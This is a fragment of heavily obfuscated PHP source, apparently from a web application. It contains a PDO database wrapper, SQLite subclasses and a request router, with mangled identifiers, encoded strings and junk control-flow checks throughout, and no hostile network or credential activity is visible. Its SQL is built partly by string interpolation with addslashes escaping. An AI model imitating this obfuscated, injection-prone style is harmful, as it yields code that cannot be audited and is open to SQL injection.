$À¼ê¹û) { } $this->connected = !0; if (1 != think_config($ù„ªÏùâ[22])) { unset($this->config); } } return $this->linkID[$öÃ¨”ƒÌ]; } public function free() { $this->PDOStatement = null; } public function query($æõåĞÃ, $«Í×Ó‰ = array()) { $òş–æèÑ =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $æõåĞÃ; if (!empty($«Í×Ó‰)) { $this->queryStr .= $òş–æèÑ[1017] . print_r($«Í×Ó‰, !0) . $òş–æèÑ[1018]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($òş–æèÑ[23], 1); think_status($òş–æèÑ[24]); $this->PDOStatement = $this->_linkID->prepare($æõåĞÃ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $íÚáÍ‰î = $this->PDOStatement->execute($«Í×Ó‰); $this->debug(); if (!1 === $íÚáÍ‰î) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($€ôÎ”¢ò, $ï©ï³ôÏ = array()) { $âÚ€§³‡ =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€ôÎ”¢ò; if (!empty($ï©ï³ôÏ)) { $this->queryStr .= $âÚ€§³‡[1017] . print_r($ï©ï³ôÏ, !0) . $âÚ€§³‡[1018]; } $¦½ÀòëÍ = !1; if ($this->dbType == $âÚ€§³‡[1011]) { if (preg_match($âÚ€§³‡[1019], $this->queryStr, $Ã¤Æ‡¾Œ)) { $this->table = think_config($âÚ€§³‡[1020]) . str_ireplace(think_config($âÚ€§³‡[1021]), $âÚ€§³‡[457], $Ã¤Æ‡¾Œ[2]); $¦½ÀòëÍ = (bool) $this->query($âÚ€§³‡[1022] . strtoupper($this->table) . $âÚ€§³‡[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($âÚ€§³‡[25], 1); think_status($âÚ€§³‡[24]); $this->PDOStatement = $this->_linkID->prepare($€ôÎ”¢ò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ˆ­Îñõ = $this->PDOStatement->execute($ï©ï³ôÏ); $this->debug(); if (!1 === $ˆ­Îñõ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¦½ÀòëÍ || preg_match($âÚ€§³‡[1023], $€ôÎ”¢ò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªÖíÅ‹ï = $this->_linkID->commit(); $this->transTimes = 0; if (!$ªÖíÅ‹ï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ê¶Øö°© = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ê¶Øö°©) { $this->error(); return !1; } } return !0; } private function getAll() { $şµÛ§™Ú = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($şµÛ§™Ú); return $şµÛ§™Ú; } public function getFields($ã¦ ì‘µ) { $§—Öœú =& $_SERVER[ˆö¿ÚÌ¼]; $this->initConnect(!0); if (think_config($§—Öœú[1024])) { $ ®÷Ö°Â = str_replace($§—Öœú[1025], $ã¦ ì‘µ, think_config($§—Öœú[1024])); } else { switch ($this->dbType) { case $§—Öœú[1008]: case $§—Öœú[1026]: $ ®÷Ö°Â = "\123\105\114\105\x43\124\40\40\x20\143\x6f\x6c\x75\155\156\x5f\156\x61\155\x65\40\x61\163\40\47\116\141\x6d\x65\x27\54\x20\x20\x20\144\x61\x74\x61\137\x74\171\x70\145\x20\141\x73\40\47\124\x79\160\145\47\54\x20\x20\x20\x63\x6f\x6c\165\155\156\137\144\x65\x66\141\165\154\164\40\x61\163\x20\47\x44\x65\x66\141\x75\x6c\164\x27\54\40\40\40\x69\x73\x5f\x6e\165\x6c\154\x61\142\154\x65\40\x61\x73\40\x27\116\165\154\x6c\x27\xa\11\x9\x46\x52\x4f\x4d\x9\151\156\146\x6f\x72\155\141\164\151\x6f\156\137\163\143\150\x65\155\x61\56\x74\141\x62\x6c\x65\163\x20\101\x53\x20\164\xa\x9\x9\112\x4f\x49\x4e\11\x69\x6e\x66\x6f\162\155\141\164\x69\157\156\x5f\x73\143\x68\145\x6d\141\56\x63\x6f\x6c\x75\x6d\x6e\x73\40\x41\123\40\143\xa\11\x9\x4f\116\x20\x20\164\56\164\141\x62\x6c\x65\137\x63\x61\x74\141\x6c\157\x67\x20\x3d\40\x63\56\x74\141\142\x6c\x65\x5f\x63\141\x74\x61\x6c\x6f\x67\12\x9\11\101\116\x44\40\x74\56\x74\141\x62\x6c\x65\137\x73\x63\x68\145\x6d\x61\x20\75\x20\x63\56\x74\x61\x62\154\145\x5f\163\x63\x68\145\x6d\x61\xa\x9\11\101\116\x44\40\x74\56\x74\141\142\154\145\x5f\x6e\x61\x6d\x65\x20\75\40\x63\x2e\x74\141\x62\154\x65\137\x6e\x61\155\145\xa\11\x9\x57\x48\105\x52\105\x20\40\40\x74\x2e\x74\141\142\154\145\137\156\141\x6d\145\40\x3d\x20\47{$ã¦ ì‘µ}\x27"; break; case $§—Öœú[1027]: $ ®÷Ö°Â = $§—Öœú[1028] . $ã¦ ì‘µ . $§—Öœú[1029]; break; case $§—Öœú[1009]: case $§—Öœú[1011]: $ ®÷Ö°Â = $§—Öœú[1030] . $§—Öœú[1031] . $§—Öœú[1032] . strtoupper($ã¦ ì‘µ) . $§—Öœú[1033] . strtoupper($ã¦ ì‘µ) . $§—Öœú[1034]; break; case $§—Öœú[1035]: $ ®÷Ö°Â = $§—Öœú[1036] . $ã¦ ì‘µ . $§—Öœú[1037]; break; case $§—Öœú[1010]: break; case $§—Öœú[1038]: default: $ ®÷Ö°Â = $§—Öœú[1039] . ($this->dbType == $§—Öœú[1038] ? "\140{$ã¦ ì‘µ}\x60" : $ã¦ ì‘µ); } } $ÀåæÊ†ï = $this->query($ ®÷Ö°Â); $ĞÍâ–© = array(); if ($ÀåæÊ†ï) { foreach ($ÀåæÊ†ï as $Ğ¥úËü => $×§Òæ“Ì) { $×§Òæ“Ì = array_change_key_case($×§Òæ“Ì); $×§Òæ“Ì[$§—Öœú[32]] = isset($×§Òæ“Ì[$§—Öœú[32]]) ? $×§Òæ“Ì[$§—Öœú[32]] : $§—Öœú[457]; $×§Òæ“Ì[$§—Öœú[33]] = isset($×§Òæ“Ì[$§—Öœú[33]]) ? $×§Òæ“Ì[$§—Öœú[33]] : $§—Öœú[457]; $Ğ‹²¬–ì = isset($×§Òæ“Ì[$§—Öœú[353]]) ? $×§Òæ“Ì[$§—Öœú[353]] : $×§Òæ“Ì[$§—Öœú[32]]; $ĞÍâ–©[$Ğ‹²¬–ì] = array($§—Öœú[32] => $Ğ‹²¬–ì, $§—Öœú[33] => $×§Òæ“Ì[$§—Öœú[33]], $§—Öœú[35] => (bool) (isset($×§Òæ“Ì[$§—Öœú[106]]) && $×§Òæ“Ì[$§—Öœú[106]] === $§—Öœú[12] || isset($×§Òæ“Ì[$§—Öœú[35]]) && $×§Òæ“Ì[$§—Öœú[35]] === $§—Öœú[12]), $§—Öœú[37] => isset($×§Òæ“Ì[$§—Öœú[37]]) ? $×§Òæ“Ì[$§—Öœú[37]] : (isset($×§Òæ“Ì[$§—Öœú[56]]) ? $×§Òæ“Ì[$§—Öœú[56]] : $§—Öœú[457]), $§—Öœú[39] => isset($×§Òæ“Ì[$§—Öœú[97]]) ? strtolower($×§Òæ“Ì[$§—Öœú[97]]) == $§—Öœú[41] : (isset($×§Òæ“Ì[$§—Öœú[57]]) ? $×§Òæ“Ì[$§—Öœú[57]] : !1), $§—Öœú[42] => isset($×§Òæ“Ì[$§—Öœú[1040]]) ? strtolower($×§Òæ“Ì[$§—Öœú[1040]]) == $§—Öœú[44] : (isset($×§Òæ“Ì[$§—Öœú[97]]) ? $×§Òæ“Ì[$§—Öœú[97]] : !1)); } } return $ĞÍâ–©; } public function getTables($Ö˜™Ì‹î = '') { $¥²õùø· =& $_SERVER[ˆö¿ÚÌ¼]; if (think_config($¥²õùø·[1041])) { $İÒŒíÔî = str_replace($¥²õùø·[1042], $Ö˜™Ì‹î, think_config($¥²õùø·[1041])); } else { switch ($this->dbType) { case $¥²õùø·[1009]: case $¥²õùø·[1011]: $İÒŒíÔî = $¥²õùø·[1043]; break; case $¥²õùø·[1008]: case $¥²õùø·[1026]: $İÒŒíÔî = $¥²õùø·[1044]; break; case $¥²õùø·[1035]: $İÒŒíÔî = $¥²õùø·[1045]; break; case $¥²õùø·[1010]: think_exception(think_lang($¥²õùø·[1046]) . $¥²õùø·[1047]); break; case $¥²õùø·[1027]: $İÒŒíÔî = $¥²õùø·[45] . $¥²õùø·[46] . $¥²õùø·[47]; break; case $¥²õùø·[1038]: default: if (!empty($Ö˜™Ì‹î)) { $İÒŒíÔî = $¥²õùø·[990] . $Ö˜™Ì‹î . $¥²õùø·[991]; } else { $İÒŒíÔî = $¥²õùø·[992]; } } } $µø¾æ´İ = $this->query($İÒŒíÔî); $±¤¼ÁÕÚ = array(); foreach ($µø¾æ´İ as $Ñ³Ğºò– => $ãõü—ïÁ) { $±¤¼ÁÕÚ[$Ñ³Ğºò–] = current($ãõü—ïÁ); } return $±¤¼ÁÕÚ; } protected function parseLimit($ğ½üÌ„) { $ïœ¨ˆ—… =& $_SERVER[ˆö¿ÚÌ¼]; $”ÂŒœ³† = $ïœ¨ˆ—…[12]; if (!empty($ğ½üÌ„)) { switch ($this->dbType) { case $ïœ¨ˆ—…[1035]: case $ïœ¨ˆ—…[1027]: $ğ½üÌ„ = explode($ïœ¨ˆ—…[50], $ğ½üÌ„); if (count($ğ½üÌ„) > 1) { $”ÂŒœ³† .= $ïœ¨ˆ—…[51] . $ğ½üÌ„[1] . $ïœ¨ˆ—…[52] . $ğ½üÌ„[0] . $ïœ¨ˆ—…[53]; } else { $”ÂŒœ³† .= $ïœ¨ˆ—…[51] . $ğ½üÌ„[0] . $ïœ¨ˆ—…[53]; } break; case $ïœ¨ˆ—…[1008]: case $ïœ¨ˆ—…[1026]: break; case $ïœ¨ˆ—…[1010]: break; case $ïœ¨ˆ—…[1009]: case $ïœ¨ˆ—…[1011]: break; case $ïœ¨ˆ—…[1038]: default: $”ÂŒœ³† .= $ïœ¨ˆ—…[51] . $ğ½üÌ„ . $ïœ¨ˆ—…[53]; } } return $”ÂŒœ³†; } public function parseKey(&$™¥È…ÄŸ, $‡áÛİç = true) { $¾ÕÑëÒ =& $_SERVER[ˆö¿ÚÌ¼]; if ($‡áÛİç) { $™¥È…ÄŸ = $this->parseKeyCheck($™¥È…ÄŸ); } if ($this->dbType == $¾ÕÑëÒ[1038]) { if ($™¥È…ÄŸ != $¾ÕÑëÒ[223] && !preg_match($¾ÕÑëÒ[1002], $™¥È…ÄŸ)) { $™¥È…ÄŸ = $¾ÕÑëÒ[464] . trim($™¥È…ÄŸ, $¾ÕÑëÒ[464]) . $¾ÕÑëÒ[464]; } return $™¥È…ÄŸ; } else { return parent::parseKey($™¥È…ÄŸ, $‡áÛİç); } } public function close() { $this->_linkID = null; } public function error() { $™—Ô–¬ =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->PDOStatement) { $‰íÉôÃ = $this->PDOStatement->errorInfo(); $this->error = $‰íÉôÃ[1] . $™—Ô–¬[4] . $‰íÉôÃ[2]; } else { $this->error = $™—Ô–¬[12]; } if ($™—Ô–¬[12] != $this->queryStr) { $this->error .= LNG($™—Ô–¬[48]) . $this->queryStr; } think_trace($this->error, $™—Ô–¬[12], $™—Ô–¬[49]); return $this->error; } public function escapeString($ÂïÌ¼åİ) { $ÆÈµÇ ä =& $_SERVER[ˆö¿ÚÌ¼]; switch ($this->dbType) { case $ÆÈµÇ ä[1035]: case $ÆÈµÇ ä[1008]: case $ÆÈµÇ ä[1026]: case $ÆÈµÇ ä[1038]: return addslashes($ÂïÌ¼åİ); case $ÆÈµÇ ä[1010]: case $ÆÈµÇ ä[1027]: case $ÆÈµÇ ä[1009]: case $ÆÈµÇ ä[1011]: return str_ireplace($ÆÈµÇ ä[58], $ÆÈµÇ ä[59], $ÂïÌ¼åİ); } } protected function parseValue($³Î„×”ß) { $¢±İƒ¹Ñ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($³Î„×”ß)) { $´ã’ùÕ = strpos($³Î„×”ß, $¢±İƒ¹Ñ[4]) === 0 && in_array($³Î„×”ß, array_keys($this->bind)); $³Î„×”ß = $´ã’ùÕ ? $this->escapeString($³Î„×”ß) : $¢±İƒ¹Ñ[1048] . $this->escapeString($³Î„×”ß) . $¢±İƒ¹Ñ[1048]; } elseif (isset($³Î„×”ß[0]) && is_string($³Î„×”ß[0]) && strtolower($³Î„×”ß[0]) == $¢±İƒ¹Ñ[375]) { $³Î„×”ß = $this->escapeString($³Î„×”ß[1]); } elseif (is_array($³Î„×”ß)) { $³Î„×”ß = array_map(array($this, $¢±İƒ¹Ñ[1049]), $³Î„×”ß); } elseif (is_bool($³Î„×”ß)) { $³Î„×”ß = $³Î„×”ß ? $¢±İƒ¹Ñ[91] : $¢±İƒ¹Ñ[231]; } elseif (is_null($³Î„×”ß)) { $³Î„×”ß = $¢±İƒ¹Ñ[106]; } return $³Î„×”ß; } public function getLastInsertId() { $Ó¯Âí±§ =& $_SERVER[ˆö¿ÚÌ¼]; switch ($this->dbType) { case $Ó¯Âí±§[1035]: case $Ó¯Âí±§[1027]: case $Ó¯Âí±§[1008]: case $Ó¯Âí±§[1026]: case $Ó¯Âí±§[1010]: case $Ó¯Âí±§[1038]: return $this->_linkID->lastInsertId(); case $Ó¯Âí±§[1009]: case $Ó¯Âí±§[1011]: $ò›á– = $this->table; $ÛŞªœ¥ = $this->query("\x53\x45\114\x45\x43\124\40{$ò›á–}\56\143\165\162\162\166\x61\154\40\x63\165\x72\x72\x76\x61\154\x20\106\122\x4f\115\40\x64\165\141\x6c"); return $ÛŞªœ¥ ? $ÛŞªœ¥[0][$Ó¯Âí±§[1050]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÅØï¿ÇÖ) { $Š‘²²ƒ» =& $_SERVER[ˆö¿ÚÌ¼]; if (!CacheLock::fileLock($Š‘²²ƒ»[13])) { return !1; } $âÖ¬—† = parent::query($ÅØï¿ÇÖ); CacheLock::fileUnLock($Š‘²²ƒ»[13]); return $âÖ¬—†; } public function execute($Ëâï›Œ¸) { $˜š×®Í² =& $_SERVER[ˆö¿ÚÌ¼]; if (!CacheLock::fileLock($˜š×®Í²[13])) { return !1; } $öÏ¿× = parent::execute($Ëâï›Œ¸); CacheLock::fileUnLock($˜š×®Í²[13]); return $öÏ¿×; } } class DbSqlite3 extends DbSqlite3Base { public function query($¹™öãÁ°) { $ÊĞİ–Ğñ =& $_SERVER[ˆö¿ÚÌ¼]; if (!CacheLock::fileLock($ÊĞİ–Ğñ[13])) { return !1; } $¾àÑØÈ° = parent::query($¹™öãÁ°); CacheLock::fileUnLock($ÊĞİ–Ğñ[13]); return $¾àÑØÈ°; } public function execute($–“µ®¨) { $ô—£ˆ‘• =& $_SERVER[ˆö¿ÚÌ¼]; if (!CacheLock::fileLock($ô—£ˆ‘•[13])) { return !1; } $†·®°Êâ = parent::execute($–“µ®¨); CacheLock::fileUnLock($ô—£ˆ‘•[13]); return $†·®°Êâ; } } goto e¢­ÛãÉŞ; fÙ…êÎ©³Á: $imylgrajsd = $_SERVER[ˆö¿ÚÌ¼][700]; if (!$imylgrajsd) { die; } class Application { private $defaultModule = "\151\x6e\x64\x65\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($û¤¨é¥¼) { $„÷ò€ö =& $_SERVER[ˆö¿ÚÌ¼]; $™Ù¦Ë³ =& $_SERVER[›üôÆØÜ]; $ºéç–‰¥ = explode($™Ù¦Ë³[0], trim($û¤¨é¥¼, $™Ù¦Ë³[0])); $¼à†Äåğ = $„÷ò€ö[701]; $this->defaultModule = $ºéç–‰¥[0] ? $ºéç–‰¥[0] : $this->defaultModule; $ç‹òë“â = $„÷ò€ö[702]; $this->defaultController = $ºéç–‰¥[1] ? $ºéç–‰¥[1] : $this->defaultController; $¾¥€ËšÀ = $„÷ò€ö[703]; if (!$¾¥€ËšÀ) { die; } $this->defaultAction = $ºéç–‰¥[2] ? $ºéç–‰¥[2] : $this->defaultAction; $å¹àå×” = $„÷ò€ö[704]; if (!$å¹àå×”) { return; } $this->xznqe486b001($™Ù¦Ë³[1], array($this, $™Ù¦Ë³[2])); $ì²ìè¨ = $„÷ò€ö[705]; if (strlen($ì²ìè¨) < $„÷ò€ö[706]) { return; } } public function appRun($ÃÌêÎ¿) { $øã½¦¿ï =& $_SERVER[ˆö¿ÚÌ¼]; $ô©‘ÔÏ• =& $_SERVER[›üôÆØÜ]; $¬÷ûŒ¹‹ = explode($ô©‘ÔÏ•[0], $ÃÌêÎ¿); $¦³†£„µ = $øã½¦¿ï[707]; while ($¦³†£„µ < $øã½¦¿ï[485]) { if ($¦³†£„µ >= 0) { break; } $¦³†£„µ++; } $˜Šãê“ö = strtolower($¬÷ûŒ¹‹[0]); $ç±Ç“ôØ = $ô©‘ÔÏ•[3]; if ($˜Šãê“ö == $ô©‘ÔÏ•[4]) { $ç±Ç“ôØ = $ô©‘ÔÏ•[5]; $¬÷ûŒ¹‹[0] = $ô©‘ÔÏ•[6]; $¬÷ûŒ¹‹[1] = $¬÷ûŒ¹‹[1] . $ô©‘ÔÏ•[7]; $ÃÌêÎ¿ = join($ô©‘ÔÏ•[0], $¬÷ûŒ¹‹); $ÃÌêÎ¿ = trim($ÃÌêÎ¿, $ô©‘ÔÏ•[0]); } call_user_func(array($ô©‘ÔÏ•[8], $ô©‘ÔÏ•[9]), $ç±Ç“ôØ . $ô©‘ÔÏ•[10], $ÃÌêÎ¿); ActionCall($ÃÌêÎ¿); call_user_func(array($ô©‘ÔÏ•[8], $ô©‘ÔÏ•[9]), $ç±Ç“ôØ . $ô©‘ÔÏ•[11], $ÃÌêÎ¿); } private function autorun() { $ÖÏ­çäÛ =& $_SERVER[ˆö¿ÚÌ¼]; $Ù•ô—Ëƒ =& $_SERVER[›üôÆØÜ]; global $config; $ÀŸÛ–Ù” = $ÖÏ­çäÛ[708]; if (strlen($ÀŸÛ–Ù”) < $ÖÏ­çäÛ[709]) { die; } if (count($config[$Ù•ô—Ëƒ[12]]) == 0) { return; } foreach ($config[$Ù•ô—Ëƒ[12]] as $·úÒ„Ù“ => $Ú±‡‹è) { $this->appRun($Ú±‡‹è); } } private function idwt181683a4() { $ÃÕŒƒº =& $_SERVER[ˆö¿ÚÌ¼]; $ò¾ı¤¯ˆ =& $_SERVER[›üôÆØÜ]; $ûÏàó¨Ÿ = $ò¾ı¤¯ˆ[4]; $å‚ö¼÷ = $ÃÕŒƒº[710]; if (!$å‚ö¼÷) { return; } $âéõ„‰å = $GLOBALS[$ò¾ı¤¯ˆ[13]][$ò¾ı¤¯ˆ[14]][0]; $ÄÉóı¡ë = $ÃÕŒƒº[711]; if (!$âéõ„‰å || strlen($âéõ„‰å) <= strlen($ûÏàó¨Ÿ)) { return; } if (strtolower(substr($âéõ„‰å, -strlen($ûÏàó¨Ÿ))) != $ûÏàó¨Ÿ) { return; } $”ô ñÏ€ = substr($âéõ„‰å, 0, -strlen($ûÏàó¨Ÿ)); $øŒ§‹—™ = array($ò¾ı¤¯ˆ[4], $”ô ñÏ€); $›ß¦¨Ôõ = $ÃÕŒƒº[712]; if (strlen($›ß¦¨Ôõ) < $ÃÕŒƒº[713]) { return; } $›ÔòŠô¿ = array_slice($GLOBALS[$ò¾ı¤¯ˆ[13]][$ò¾ı¤¯ˆ[14]], 1); $ØïÆÖˆ = $ÃÕŒƒº[714]; while ($ØïÆÖˆ < $ÃÕŒƒº[697]) { if ($ØïÆÖˆ >= 0) { break; } $ØïÆÖˆ++; } $GLOBALS[$ò¾ı¤¯ˆ[13]][$ò¾ı¤¯ˆ[14]] = array_merge($øŒ§‹—™, $›ÔòŠô¿); $ëî¯ıòá = $ÃÕŒƒº[715]; $GLOBALS[$ò¾ı¤¯ˆ[13]][$ò¾ı¤¯ˆ[15]] = implode($ò¾ı¤¯ˆ[0], $GLOBALS[$ò¾ı¤¯ˆ[13]][$ò¾ı¤¯ˆ[14]]); } private function olgt674341d1() { $ê¶©›¸´ =& $_SERVER[ˆö¿ÚÌ¼]; $Á¸¨ŠØ =& $_SERVER[›üôÆØÜ]; if ($GLOBALS[$Á¸¨ŠØ[13]][$Á¸¨ŠØ[15]] != $Á¸¨ŠØ[6]) { return; } $–šĞÁ®á = $_SERVER[$Á¸¨ŠØ[16]]; $„Åéñâ— = $ê¶©›¸´[716]; $°¨ªÄÉİ = $Á¸¨ŠØ[17]; $æÍõ–å¡ = $ê¶©›¸´[717]; if (!$æÍõ–å¡) { die; } if (!strstr($–šĞÁ®á, $°¨ªÄÉİ)) { return; } $ÓŠ¦Îì­ = strrpos($–šĞÁ®á, $°¨ªÄÉİ); $Áçı±¼û = $ê¶©›¸´[718]; if (!$Áçı±¼û) { return; } $±Ü®š€è = substr($–šĞÁ®á, $ÓŠ¦Îì­ + strlen($°¨ªÄÉİ)); $‘ŞÒ–Ùş = $ê¶©›¸´[719]; if (!$‘ŞÒ–Ùş) { die; } preg_match_all($Á¸¨ŠØ[18], $±Ü®š€è, $©ÃÚ’„¬); $ß›ø…‚« = $ê¶©›¸´[720]; if (strlen($ß›ø…‚«) < $ê¶©›¸´[697]) { return; } $±Ü®š€è = trim($©ÃÚ’„¬[0][0], $Á¸¨ŠØ[19]); $GLOBALS[$Á¸¨ŠØ[13]][$Á¸¨ŠØ[14]] = explode($Á¸¨ŠØ[19], $±Ü®š€è); $çÚ¬ùí” = $ê¶©›¸´[721]; while ($çÚ¬ùí” < $ê¶©›¸´[706]) { if ($çÚ¬ùí” >= 0) { break; } $çÚ¬ùí”++; } $GLOBALS[$Á¸¨ŠØ[13]][$Á¸¨ŠØ[15]] = implode($Á¸¨ŠØ[0], $GLOBALS[$Á¸¨ŠØ[13]][$Á¸¨ŠØ[14]]); $êÙ²…Ÿ = $ê¶©›¸´[722]; if (!$êÙ²…Ÿ) { return; } } public function run() { $§ÌŠïÈÆ =& $_SERVER[ˆö¿ÚÌ¼]; $Şíùîšº =& $_SERVER[›üôÆØÜ]; $this->olgt674341d1(); $üÚñáä› = $§ÌŠïÈÆ[723]; if (strlen($üÚñáä›) < $§ÌŠïÈÆ[713]) { die; } $this->idwt181683a4(); $µêÚ÷ÍÑ = $§ÌŠïÈÆ[724]; if (!$µêÚ÷ÍÑ) { die; } $ÏÜ¼æô = $GLOBALS[$Şíùîšº[13]][$Şíùîšº[14]]; $­ÎœÃÒÄ = $GLOBALS[$Şíùîšº[13]][$Şíùîšº[15]]; $ºÂ¡€Š = $§ÌŠïÈÆ[725]; if (strlen($ºÂ¡€Š) < $§ÌŠïÈÆ[697]) { die; } define($Şíùîšº[20], isset($ÏÜ¼æô[0]) && $ÏÜ¼æô[0] ? $ÏÜ¼æô[0] : $this->defaultModule); $ñ™É§Ùè = $§ÌŠïÈÆ[726]; if (!$ñ™É§Ùè) { die; } define($Şíùîšº[21], isset($ÏÜ¼æô[1]) && $ÏÜ¼æô[0] ? $ÏÜ¼æô[1] : $this->defaultController); $¼ıàÇ Ó = $§ÌŠïÈÆ[727]; while (strlen($¼ıàÇ Ó) < $§ÌŠïÈÆ[485]) { if (!$¼ıàÇ Ó) { break; } $¼ıàÇ Ó++; } define($Şíùîšº[22], isset($ÏÜ¼æô[2]) && $ÏÜ¼æô[0] ? $ÏÜ¼æô[2] : $this->defaultAction); define($Şíùîšº[23], MOD . $Şíùîšº[0] . ST . $Şíùîšº[0] . ACT); $_SERVER[$Şíùîšº[24]] = strtolower(ACTION); $this->autorun(); $†ãŸúÒÌ = $§ÌŠïÈÆ[728]; while ($†ãŸúÒÌ < $§ÌŠïÈÆ[697]) { if ($†ãŸúÒÌ >= 0) { break; } $†ãŸúÒÌ++; } if (count($ÏÜ¼æô) >= 3) { $this->appRun($­ÎœÃÒÄ); } else { $this->appRun(ACTION); } } private $yuqic9f24708 = array(); private $tchv2c1c01f8 = ''; public function btca61c61e91() { $“”äİò² =& $_SERVER[ˆö¿ÚÌ¼]; $†ªûğ¼Š =& $_SERVER[›üôÆØÜ]; $this->hlqvc72ab3a3(); $ñäÁ­Ä³ = $“”äİò²[729]; if (strlen($ñäÁ­Ä³) < $“”äİò²[713]) { die; } $this->mhura1b6e8dd(); $¡¿óæêÖ = $“”äİò²[721]; if (!$¡¿óæêÖ) { return; } $this->lcdv503e30ea(); $ºº˜…¦‡ = $“”äİò²[730]; if (!$ºº˜…¦‡) { return; } $this->yolz1d8a65f5(); $ Š¾æÓë = $“”äİò²[731]; if (strlen($ Š¾æÓë) < $“”äİò²[706]) { die; } $this->vhax89e86024(); $ˆëØÄ«ş = $“”äİò²[732]; while (strlen($ˆëØÄ«ş) < $“”äİò²[706]) { if (!$ˆëØÄ«ş) { break; } $ˆëØÄ«ş++; } $this->pzog2b17aee0(); $this->rukgf93eda07(); $this->xznqe486b001($†ªûğ¼Š[25], array($this, $†ªûğ¼Š[26])); $ÈÉ¦«’Å = $“”äİò²[733]; if (!$ÈÉ¦«’Å) { return; } $this->xznqe486b001($†ªûğ¼Š[27], array($this, $†ªûğ¼Š[28])); $îİ©ğ´ø = $“”äİò²[734]; if (!$îİ©ğ´ø) { return; } $this->xznqe486b001($†ªûğ¼Š[29], array($this, $†ªûğ¼Š[30])); $this->xznqe486b001($†ªûğ¼Š[31], array($this, $†ªûğ¼Š[32])); $ùµˆÛ’Ó = $“”äİò²[735]; if (strlen($ùµˆÛ’Ó) < $“”äİò²[709]) { die; } } public function wzie6e0d97ab($ÊÕ„È¨’) { $€œàõ·Ï =& $_SERVER[ˆö¿ÚÌ¼]; $˜ÖÌÔ¥™ =& $_SERVER[›üôÆØÜ]; $Úó§ü˜ş = Model($˜ÖÌÔ¥™[33])->get(); $ºöÆÇñ› = array($˜ÖÌÔ¥™[34], $˜ÖÌÔ¥™[35], $˜ÖÌÔ¥™[36], $˜ÖÌÔ¥™[37], $˜ÖÌÔ¥™[38], $˜ÖÌÔ¥™[39], $˜ÖÌÔ¥™[40], $˜ÖÌÔ¥™[41], $˜ÖÌÔ¥™[42], $˜ÖÌÔ¥™[43], $˜ÖÌÔ¥™[44], $˜ÖÌÔ¥™[45], $˜ÖÌÔ¥™[46], $˜ÖÌÔ¥™[47], $˜ÖÌÔ¥™[48], $˜ÖÌÔ¥™[49], $˜ÖÌÔ¥™[50], $˜ÖÌÔ¥™[51], $˜ÖÌÔ¥™[52], $˜ÖÌÔ¥™[53], $˜ÖÌÔ¥™[54], $˜ÖÌÔ¥™[55], $˜ÖÌÔ¥™[56], $˜ÖÌÔ¥™[57], $˜ÖÌÔ¥™[58], $˜ÖÌÔ¥™[59], $˜ÖÌÔ¥™[60], $˜ÖÌÔ¥™[61], $˜ÖÌÔ¥™[62], $˜ÖÌÔ¥™[63], $˜ÖÌÔ¥™[64], $˜ÖÌÔ¥™[65], $˜ÖÌÔ¥™[66], $˜ÖÌÔ¥™[67], $˜ÖÌÔ¥™[68], $˜ÖÌÔ¥™[69], $˜ÖÌÔ¥™[70], $˜ÖÌÔ¥™[71], $˜ÖÌÔ¥™[72], $˜ÖÌÔ¥™[73], $˜ÖÌÔ¥™[74], $˜ÖÌÔ¥™[75], $˜ÖÌÔ¥™[76], $˜ÖÌÔ¥™[77], $˜ÖÌÔ¥™[78], $˜ÖÌÔ¥™[79], $˜ÖÌÔ¥™[80], $˜ÖÌÔ¥™[81], $˜ÖÌÔ¥™[82], $˜ÖÌÔ¥™[83], $˜ÖÌÔ¥™[84], $˜ÖÌÔ¥™[85]); foreach ($ºöÆÇñ› as $®ÄŒÛ’Õ) { $áÇŠ‘Æ = $GLOBALS[$˜ÖÌÔ¥™[86]][$˜ÖÌÔ¥™[87]][$®ÄŒÛ’Õ]; $“ªªûãñ = $€œàõ·Ï[736]; while ($“ªªûãñ < $€œàõ·Ï[713]) { if ($“ªªûãñ >= 0) { break; } $“ªªûãñ++; } if (isset($Úó§ü˜ş[$®ÄŒÛ’Õ])) { $áÇŠ‘Æ = $Úó§ü˜ş[$®ÄŒÛ’Õ]; } $ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[89]][$®ÄŒÛ’Õ] = $áÇŠ‘Æ; } $ú‡îèğÛ = $ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[89]][$˜ÖÌÔ¥™[46]]; $ùİÁå¢‚ = $€œàõ·Ï[737]; if (!$ùİÁå¢‚) { return; } unset($ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[90]][$˜ÖÌÔ¥™[91]]); unset($ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[90]][$˜ÖÌÔ¥™[92]]); $Å¿õûò§ = $€œàõ·Ï[738]; if (strlen($Å¿õûò§) < $€œàõ·Ï[485]) { die; } unset($ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[89]][$˜ÖÌÔ¥™[46]]); $È°§Ç‘® = $€œàõ·Ï[739]; if (strlen($È°§Ç‘®) < $€œàõ·Ï[697]) { die; } unset($ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[89]][$˜ÖÌÔ¥™[93]]); $‹¬ÊäìÈ = $€œàõ·Ï[740]; 